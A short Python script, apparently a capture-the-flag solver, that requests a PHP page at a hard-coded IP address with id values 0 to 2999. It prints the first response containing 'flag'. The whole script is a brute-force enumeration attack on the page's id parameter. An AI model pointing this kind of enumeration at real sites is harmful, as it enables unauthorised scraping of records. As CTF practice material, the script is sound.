import requests

session = requests.Session()
url = "http://39.99.234.254/bots/tp1.php"
headers = {"Cache-Control": "max-age=0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Upgrade-Insecure-Requests": "1",
           "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36", "Connection": "close", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6"}

def one_loop(idx):
    paramsGet = {"id": str(idx)}
    response = session.get(url,params=paramsGet, headers=headers)
    return response.content

def main():
    for i in range(3000):
        print("check page %d"%i)
        htmlcode = one_loop(i)
        if "flag" in htmlcode:
            print(htmlcode)
            exit()
if __name__ == '__main__':
    main()
